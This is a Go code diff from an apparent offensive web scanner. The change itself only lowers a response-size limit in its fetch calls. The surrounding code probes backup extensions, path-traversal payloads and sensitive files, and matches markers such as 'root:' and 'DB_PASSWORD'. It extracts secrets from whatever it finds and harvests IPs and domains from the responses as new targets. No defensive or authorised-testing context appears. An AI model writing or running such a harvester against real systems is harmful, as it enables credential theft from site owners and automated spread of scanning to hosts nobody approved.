@@ -87,18 +87,18 @@ func (s *UAFRScanner) Scan(client *fasthttp.Client, host string, port int, path 
 	if strings.Contains(part, ".") {
 		for _, ext := range bkpExts {
 			u := base + path + ext
-			r := utils.Fetch(client, u, "GET", h, 2, 500_000_000)
+			r := utils.Fetch(client, u, "GET", h, 2, 150_000_000)
 			if r != nil && r.Status == 200 && r.Size > 50 && utils.ContainsAny(r.Body, sensMarkers) {
 				if pResp == nil { pResp = r }; allS = append(allS, extractors.ExtractSecrets(r.Body, u)...); td := extractors.ExtractAllTargets(r.Body, u); allT = append(allT, td.IPs...); allT = append(allT, td.Domains...)
 			}
 		}
 	}
 	for _, payload := range travPayloads {
-		u := base + "/" + payload; r := utils.Fetch(client, u, "GET", h, 2, 500_000_000)
+		u := base + "/" + payload; r := utils.Fetch(client, u, "GET", h, 2, 150_000_000)
 		if r != nil && r.Status == 200 { for _, tm := range []string{"root:", "[extensions]", "DB_PASSWORD"} { if strings.Contains(r.Body, tm) { if pResp == nil { pResp = r }; allS = append(allS, extractors.ExtractSecrets(r.Body, u)...); break } }; break }
 	}
 	parentDir := "/"; if last > 0 { parentDir = path[:last+1] }
-	for _, fn := range sensFiles { for _, pfx := range []string{"/", parentDir} { u := base + pfx + fn; r := utils.Fetch(client, u, "GET", h, 2, 500_000_000); if r != nil && r.Status == 200 && r.Size > 20 { ss := extractors.ExtractSecrets(r.Body, u); if len(ss) > 0 { if pResp == nil { pResp = r }; allS = append(allS, ss...); td := extractors.ExtractAllTargets(r.Body, u); allT = append(allT, td.IPs...); allT = append(allT, td.Domains...) } } } }
+	for _, fn := range sensFiles { for _, pfx := range []string{"/", parentDir} { u := base + pfx + fn; r := utils.Fetch(client, u, "GET", h, 2, 150_000_000); if r != nil && r.Status == 200 && r.Size > 20 { ss := extractors.ExtractSecrets(r.Body, u); if len(ss) > 0 { if pResp == nil { pResp = r }; allS = append(allS, ss...); td := extractors.ExtractAllTargets(r.Body, u); allT = append(allT, td.IPs...); allT = append(allT, td.Domains...) } } } }
 	if pResp != nil && (len(allS) > 0 || len(allT) > 0) { return &core.ScanResult{URL: base + path, Status: pResp.Status, Scanner: s.Name(), Secrets: allS, NewTargets: uniqueStrings(allT), ResponseSize: pResp.Size} }
 	return nil
 }
